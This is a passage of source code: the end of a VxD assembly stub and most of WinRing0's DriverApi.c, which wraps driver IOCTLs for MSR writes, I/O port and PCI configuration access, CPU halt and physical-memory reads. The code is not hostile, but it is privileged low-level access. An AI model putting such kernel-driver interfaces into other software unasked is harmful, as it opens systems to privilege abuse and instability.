;        V I R T U A L   D E V I C E   D E C L A R A T I O N
;============================================================================

DECLARE_VIRTUAL_DEVICE  OPENLS, 1, 0, OPENLS_Control, Undefined_Device_ID, \
                        UNDEFINED_INIT_ORDER, 0 ,0

;============================================================================
;        OPENLS_Control
;============================================================================

VxD_LOCKED_CODE_SEG

BeginProc OPENLS_Control
    Control_Dispatch SYS_DYNAMIC_DEVICE_INIT, Dynamic_Init, sCall
    Control_Dispatch SYS_DYNAMIC_DEVICE_EXIT, Dynamic_Exit, sCall
    Control_Dispatch W32_DEVICEIOCONTROL,     W32_DeviceIOControl,\
                     sCall, <ecx, ebx, edx, esi>
    clc
    ret
EndProc OPENLS_Control

public C Exec_VxD_Int_rap
Exec_VxD_Int_rap proc
    push    dword ptr 1ah
    VmmCall Exec_VxD_Int
    ret
Exec_VxD_Int_rap endp

VxD_LOCKED_CODE_ENDS

end

```

`source/WormholeDrivers/WINRING0/drv/DriverApi.c`:

```c
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                          Copyright 2007 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------


#include<Windows.h>
#include <intrin.h>
#include "DriverIoCtl.h"
#include "DriverApi.h"
//-----------------------------------------------------------------------------
//
// Defines
//
//-----------------------------------------------------------------------------

const BYTE gPciNumberOfDevice =	32;
const BYTE gPciNumberOfFunction = 8;

//-----------------------------------------------------------------------------
//
// Global
//
//-----------------------------------------------------------------------------

BYTE gPciMaxNumberOfBus = 255;

extern HANDLE gHandle;

extern BOOL gIsNT;
extern BOOL gIsCpuid;
extern BOOL gIsMsr;
extern BOOL gIsTsc;
extern BOOL gInitDll;

extern DWORD gDllStatus;
extern DWORD gDriverType;
extern TCHAR gDriverPath[MAX_PATH];



DWORD WINAPI GetDriverVersion(PBYTE major, PBYTE minor, PBYTE revision, PBYTE release)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	value = 0;

	result = DeviceIoControl(
                        gHandle,
                        IOCTL_OLS_GET_DRIVER_VERSION,
                        NULL,     
                        0,
                        &value,
                        sizeof(value),
                        &returnedLength,
                        NULL
                        );

	if(result)
	{
		if(major != NULL && minor != NULL && revision != NULL && release != NULL)
		{
			*major = (BYTE)((value >> 24) & 0xFF);
			*minor = (BYTE)((value >> 16) & 0xFF);
			*revision = (BYTE)((value >> 8) & 0xFF);
			*release = (BYTE)((value) & 0xFF);		
		}
	}
	else
	{
		value = 0;
	}
	
	return value;
}

DWORD WINAPI GetDriverType()
{
	return gDriverType;
}

//-----------------------------------------------------------------------------
//
// CPU
//
//-----------------------------------------------------------------------------

BOOL WINAPI IsCpuid()
{
	return gIsCpuid;
}

BOOL WINAPI IsMsr()
{
	return gIsMsr;
}

BOOL WINAPI IsTsc()
{
	return gIsTsc;
}

BOOL WINAPI Rdmsr(DWORD index, PDWORD eax, PDWORD edx)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	if(eax == NULL || edx == NULL || gIsMsr == FALSE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
 	BOOL	result = FALSE;
	BYTE	outBuf[8] = {0};

	result = DeviceIoControl(
					gHandle,
					IOCTL_OLS_READ_MSR,
					&index,
					sizeof(index),
					&outBuf,
					sizeof(outBuf),
					&returnedLength,
					NULL
					);

	if(result)
	{
		memcpy(eax, outBuf, 4);
		memcpy(edx, outBuf + 4, 4);
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI RdmsrTx(DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Rdmsr(index, eax, edx);

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI RdmsrPx(DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Rdmsr(index, eax, edx);

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}

BOOL WINAPI Wrmsr(DWORD index, DWORD eax, DWORD edx)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	if(gIsMsr == FALSE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
 	BOOL	result = FALSE;
	DWORD	outBuf;
	OLS_WRITE_MSR_INPUT inBuf;

	inBuf.Register = index;
	inBuf.Value.HighPart = edx;
	inBuf.Value.LowPart = eax;

	result = DeviceIoControl(
					gHandle,
					IOCTL_OLS_WRITE_MSR,
					&inBuf,
					sizeof(inBuf),
					&outBuf,
					sizeof(outBuf),
					&returnedLength,
					NULL
					);

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI WrmsrTx(DWORD index, DWORD eax, DWORD edx, DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Wrmsr(index, eax, edx);

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI WrmsrPx(DWORD index, DWORD eax, DWORD edx, DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Wrmsr(index, eax, edx);

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}

BOOL WINAPI Rdpmc(DWORD index, PDWORD eax, PDWORD edx)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	if(eax == NULL || edx == NULL)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	BYTE	outBuf[8] = {0};

	result = DeviceIoControl(
					gHandle,
					IOCTL_OLS_READ_PMC,
					&index,	
					sizeof(index),
					&outBuf,
					sizeof(outBuf),
					&returnedLength,
					NULL
					);

	if(result)
	{
		memcpy(eax, outBuf, 4);
		memcpy(edx, outBuf + 4, 4);
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI RdpmcTx(DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Rdpmc(index, eax, edx);

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI RdpmcPx(DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Rdpmc(index, eax, edx);

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}

BOOL WINAPI Cpuid(DWORD index, PDWORD eax, PDWORD ebx, PDWORD ecx, PDWORD edx)
{
	if(eax == NULL || ebx == NULL || ecx == NULL || edx == NULL || gIsCpuid == FALSE)
	{
		return FALSE;
	}

	int info[4];
	__cpuid(info, index);
	*eax = info[0];
	*ebx = info[1];
	*ecx = info[2];
	*edx = info[3];

	return TRUE;
}

BOOL WINAPI CpuidTx(DWORD index, PDWORD eax, PDWORD ebx, PDWORD ecx, PDWORD edx, DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Cpuid(index, eax, ebx, ecx, edx);

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI CpuidPx(DWORD index, PDWORD eax, PDWORD ebx, PDWORD ecx, PDWORD edx, DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Cpuid(index, eax, ebx, ecx, edx);

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}


BOOL WINAPI Rdtsc(PDWORD eax, PDWORD edx)
{
	if(eax == NULL || edx == NULL || gIsTsc == FALSE)
	{
		return FALSE;
	}

	ULONGLONG value = 0;
	
	value = __rdtsc();
	*eax = (DWORD)((value >>  0) & 0xFFFFFFFF);
	*edx = (DWORD)((value >> 32) & 0xFFFFFFFF);

	return TRUE;
}

BOOL WINAPI RdtscTx(PDWORD eax, PDWORD edx, DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Rdtsc(eax, edx);

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI RdtscPx(PDWORD eax, PDWORD edx, DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Rdtsc(eax, edx);

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}

BOOL WINAPI Hlt()
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
 	BOOL	result = FALSE;

	result = DeviceIoControl(
					gHandle,
					IOCTL_OLS_HALT,	
					NULL,
					0,
					NULL,
					0,
					&returnedLength,
					NULL
					);

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI HltTx(DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Hlt();

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI HltPx(DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Hlt();

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}

//-----------------------------------------------------------------------------
//
// I/O
//
//-----------------------------------------------------------------------------

//-----------------------------------------------------------------------------
// I/O Read (No Error Check)
//-----------------------------------------------------------------------------

BYTE WINAPI ReadIoPortByte(WORD port)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	WORD	value = 0;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_BYTE,
						&port,
						sizeof(port),
						&value,
						sizeof(value),
						&returnedLength,
						NULL
						);

	return (BYTE)value;
}

WORD WINAPI ReadIoPortWord(WORD port)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	WORD	value = 0;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_WORD,
						&port,     
						sizeof(port),
						&value,
						sizeof(value),
						&returnedLength,
						NULL
						);

	return value;
}

DWORD WINAPI ReadIoPortDword(WORD port)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	port4 = port;
	DWORD	value = 0;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_DWORD,
						&port4,     
						sizeof(port4),	// required 4 bytes
						&value,
						sizeof(value),
						&returnedLength,
						NULL
						);

	return value;
}

//-----------------------------------------------------------------------------
// I/O Read (Error Check)
//-----------------------------------------------------------------------------

BOOL WINAPI ReadIoPortByteEx(WORD port, PBYTE value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	WORD	val = 0;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_BYTE,
						&port,
						sizeof(port),
						&val,
						sizeof(val),
						&returnedLength,
						NULL
						);

	if(result)
	{
		*value = (BYTE)val;
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI ReadIoPortWordEx(WORD port, PWORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	WORD	val = 0;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_WORD,
						&port,     
						sizeof(port),
						&val,
						sizeof(val),
						&returnedLength,
						NULL
						);

	if(result)
	{
		*value = val;
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI ReadIoPortDwordEx(WORD port, PDWORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	val = port;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_DWORD,
						&val,     
						sizeof(val),	// required 4 bytes
						&val,
						sizeof(val),
						&returnedLength,
						NULL
						);

	if(result)
	{
		*value = val;
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

//-----------------------------------------------------------------------------
// I/O Write (No Error Check)
//-----------------------------------------------------------------------------

VOID WINAPI WriteIoPortByte(WORD port, BYTE value)
{
	if(gHandle == INVALID_HANDLE_VALUE){return ;}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD   length = 0;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.CharData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.CharData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_BYTE,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);
}

VOID WINAPI WriteIoPortWord(WORD port, WORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE){return ;}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD   length = 0;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.ShortData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.ShortData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_WORD,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);
}

VOID WINAPI WriteIoPortDword(WORD port, DWORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE){return ;}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD   length = 0;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.LongData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.LongData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_DWORD,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);
}

//-----------------------------------------------------------------------------
// I/O Write (Error Check)
//-----------------------------------------------------------------------------

BOOL WINAPI WriteIoPortByteEx(WORD port, BYTE value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	DWORD   length = 0;
	BOOL	result = FALSE;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.CharData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.CharData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_BYTE,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI WriteIoPortWordEx(WORD port, WORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	DWORD   length = 0;
	BOOL	result = FALSE;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.ShortData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.ShortData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_WORD,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI WriteIoPortDwordEx(WORD port, DWORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD   length = 0;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.LongData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.LongData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_DWORD,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);
	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

//-----------------------------------------------------------------------------
//
// PCI Configuration Read
//
//-----------------------------------------------------------------------------

BOOL pciConfigRead(DWORD pciAddress, DWORD regAddress, PBYTE value, DWORD size, PDWORD error)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if(value == NULL)
	{
		return FALSE;
	}
	// alignment check
	if(size == 2 && (regAddress & 1) != 0)
	{
		return FALSE;
	}
	if(size == 4 && (regAddress & 3) != 0)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	OLS_READ_PCI_CONFIG_INPUT inBuf;

	inBuf.PciAddress = pciAddress;
	inBuf.PciOffset = regAddress;

	result = DeviceIoControl(
                            gHandle,
                            IOCTL_OLS_READ_PCI_CONFIG,
                            &inBuf,
                            sizeof(inBuf),
                            value,
                            size,
                            &returnedLength,
                            NULL
                            );

	if(error != NULL)
	{
		*error = GetLastError();
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

//-----------------------------------------------------------------------------
// PCI Configuration Read (No Error Check)
//-----------------------------------------------------------------------------

BYTE WINAPI ReadPciConfigByte(DWORD pciAddress, BYTE regAddress)
{
	BYTE ret;
	if(pciConfigRead(pciAddress, regAddress, (PBYTE)&ret, sizeof(ret), NULL))
	{
		return ret;
	}
	else
	{
		return 0xFF;
	}
}

WORD WINAPI ReadPciConfigWord(DWORD pciAddress, BYTE regAddress)
{
	WORD ret;
	if(pciConfigRead(pciAddress, regAddress, (PBYTE)&ret, sizeof(ret), NULL))
	{
		return ret;
	}
	else
	{
		return 0xFFFF;
	}
}

DWORD WINAPI ReadPciConfigDword(DWORD pciAddress, BYTE regAddress)
{
	DWORD ret;
	if(pciConfigRead(pciAddress, regAddress, (PBYTE)&ret, sizeof(ret), NULL))
	{
		return ret;
	}
	else
	{
		return 0xFFFFFFFF;
	}
}

//-----------------------------------------------------------------------------
// PCI Configuration Read (Error Check)
//-----------------------------------------------------------------------------

BOOL WINAPI ReadPciConfigByteEx(DWORD pciAddress, DWORD regAddress, PBYTE value)
{
	return pciConfigRead(pciAddress, regAddress, (PBYTE)value, sizeof(BYTE), NULL);
}

BOOL WINAPI ReadPciConfigWordEx(DWORD pciAddress, DWORD regAddress, PWORD value)
{
	return pciConfigRead(pciAddress, regAddress, (PBYTE)value, sizeof(WORD), NULL);
}

BOOL WINAPI ReadPciConfigDwordEx(DWORD pciAddress, DWORD regAddress, PDWORD value)
{
	return pciConfigRead(pciAddress, regAddress, (PBYTE)value, sizeof(DWORD), NULL);
}

//-----------------------------------------------------------------------------
//
// PCI Configuration Write
//
//-----------------------------------------------------------------------------

BOOL pciConfigWrite(DWORD pciAddress, DWORD regAddress, PBYTE value, DWORD size)
{
	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	int		inputSize = 0;
	OLS_WRITE_PCI_CONFIG_INPUT	*inBuf;

	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if(value == NULL)
	{
		return FALSE;
	}
	// alignment check
	if(size == 2 && (regAddress & 1) != 0)
	{
		return FALSE;
	}
	if(size == 4 && (regAddress & 3) != 0)
	{
		return FALSE;
	}

	inputSize = offsetof(OLS_WRITE_PCI_CONFIG_INPUT, Data) + size;
	inBuf = (OLS_WRITE_PCI_CONFIG_INPUT*)malloc(inputSize);
	if(inBuf == NULL)
	{
		return FALSE;
	}
	memcpy(inBuf->Data, value, size);
	inBuf->PciAddress = pciAddress;
	inBuf->PciOffset = regAddress;
	result = DeviceIoControl(
                            gHandle,
                            IOCTL_OLS_WRITE_PCI_CONFIG,
                            inBuf,
                            inputSize,
                            NULL,
                            0,
                            &returnedLength,
                            NULL
                            );
	free(inBuf);

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

//-----------------------------------------------------------------------------
// PCI Configuration Write (No Error Check)
//-----------------------------------------------------------------------------

VOID WINAPI WritePciConfigByte(DWORD pciAddress, BYTE regAddress, BYTE value)
{
	pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

VOID WINAPI WritePciConfigWord(DWORD pciAddress, BYTE regAddress, WORD value)
{
	pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

VOID WINAPI WritePciConfigDword(DWORD pciAddress, BYTE regAddress, DWORD value)
{
	pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

//-----------------------------------------------------------------------------
// PCI Configuration Write (Error Check)
//-----------------------------------------------------------------------------

BOOL WINAPI WritePciConfigByteEx(DWORD pciAddress, DWORD regAddress, BYTE value)
{
	return pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

BOOL WINAPI WritePciConfigWordEx(DWORD pciAddress, DWORD regAddress, WORD value)
{
	return pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

BOOL WINAPI WritePciConfigDwordEx(DWORD pciAddress, DWORD regAddress, DWORD value)
{
	return pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

//-----------------------------------------------------------------------------
//
// FindPciDevice
//
//-----------------------------------------------------------------------------

VOID WINAPI SetPciMaxBusIndex(BYTE max)
{
	gPciMaxNumberOfBus = max;
}

DWORD WINAPI FindPciDeviceById(WORD vendorId, WORD deviceId, BYTE index)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0xFFFFFFFF;
	}

	DWORD bus = 0, dev = 0, func = 0;
	DWORD count = 0;
	DWORD pciAddress = 0xFFFFFFFF;
	DWORD id = 0;
	DWORD error = 0;	
	BOOL multiFuncFlag = FALSE;
	BYTE type = 0;
	count = 0;

	if(vendorId == 0xFFFF)
	{
		return 0xFFFFFFFF;
	}

	for(bus = 0; bus <= gPciMaxNumberOfBus; bus++)
	{
		for(dev = 0; dev < gPciNumberOfDevice; dev++)
		{
			multiFuncFlag = FALSE;
			for(func = 0; func < gPciNumberOfFunction; func++)
			{
				if(multiFuncFlag == 0 && func > 0)
				{
					break;
				}

				pciAddress = PciBusDevFunc(bus, dev, func);
				if(pciConfigRead(pciAddress, 0, (PBYTE)&id, sizeof(id), &error))
				{
					if(func == 0) // Is Multi Function Device
					{
						if(pciConfigRead(pciAddress, 0x0E, (PBYTE)&type, sizeof(type), NULL))
						{
							if(type & 0x80)
							{
								multiFuncFlag = TRUE;
							}
						}
					}

					if(id == (vendorId | ((DWORD)deviceId << 16)))
					{
						if(count == index) 
						{
							return pciAddress;
						}
						count++;
						continue;
					}
				}
				/*
				else if(error == OLS_ERROR_PCI_BUS_NOT_EXIST)
				{
					break; 
				}
				else if(error == OLS_ERROR_PCI_NO_DEVICE && func == 0)
				{
					break;
				}
				*/
			}
		}
	}
	return 0xFFFFFFFF;
}

DWORD WINAPI FindPciDeviceByClass(BYTE baseClass, BYTE subClass, BYTE programIf, BYTE index)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0xFFFFFFFF;
	}

	DWORD bus = 0, dev = 0, func = 0;
	DWORD count = 0;
	DWORD pciAddress = 0xFFFFFFFF;
	DWORD conf[3] = {0};
	DWORD error = 0;	
	BOOL multiFuncFlag = FALSE;
	BYTE type = 0;
	count = 0;

	for(bus = 0; bus <= gPciMaxNumberOfBus; bus++)
	{
		for(dev = 0; dev < gPciNumberOfDevice; dev++)
		{
			multiFuncFlag = FALSE;
			for(func = 0; func < gPciNumberOfFunction; func++)
			{
				if(multiFuncFlag == FALSE && func > 0)
				{
					break;
				}
				pciAddress = PciBusDevFunc(bus, dev, func);
				if(pciConfigRead(pciAddress, 0, (BYTE*)conf, sizeof(conf), &error))
				{
					if(func == 0) // Is Multi Function Device
					{ 
						if(pciConfigRead(pciAddress, 0x0E, (BYTE*)&type, sizeof(type), NULL))
						{
							if(type & 0x80)
							{
								multiFuncFlag = TRUE;
							}
						}
					}
					if((conf[2] & 0xFFFFFF00) == 
							(((DWORD)baseClass << 24) |
							((DWORD)subClass << 16) |
							((DWORD)programIf << 8))
						)
					{
						if(count == index)
						{
							return pciAddress;
						}
						count++;
						continue;
					}
				}
				/*
				else if(error == OLS_ERROR_PCI_BUS_NOT_EXIST)
				{
					break;
				}
				else if(error == OLS_ERROR_PCI_NO_DEVICE && func == 0)
				{
					break;
				}
				*/
			}
		}
	}
	return 0xFFFFFFFF;
}

//-----------------------------------------------------------------------------
//
// Physical Memory
//
//-----------------------------------------------------------------------------
#ifdef _PHYSICAL_MEMORY_SUPPORT
DWORD WINAPI ReadDmiMemory(PBYTE buffer, DWORD count, DWORD unitSize)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	if(buffer == NULL)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	size = 0;
	OLS_READ_MEMORY_INPUT inBuf;

	if(sizeof(DWORD_PTR) == 4)
	{
		inBuf.Address.HighPart = 0;
		inBuf.Address.LowPart = (DWORD)0x000F0000;
	}
	else
	{
		inBuf.Address.QuadPart = 0x000F0000;
	}

	inBuf.UnitSize = unitSize;
	inBuf.Count = count;
	size = inBuf.UnitSize * inBuf.Count;

	if(size > 65536)
	{
		return 0;
	}

    result = DeviceIoControl(
                        gHandle,
                        IOCTL_OLS_READ_MEMORY,
                        &inBuf,
                        sizeof(OLS_READ_MEMORY_INPUT),
                        buffer,
                        size,
                        &returnedLength,
                        NULL
                        );

    if(result && returnedLength == size)
	{
		return count * unitSize;
	}
	else
	{
		return 0;
	}
}

DWORD WINAPI ReadPhysicalMemory(DWORD_PTR address, PBYTE buffer, DWORD count, DWORD unitSize)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	if(buffer == NULL)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	size = 0;
	OLS_READ_MEMORY_INPUT inBuf;

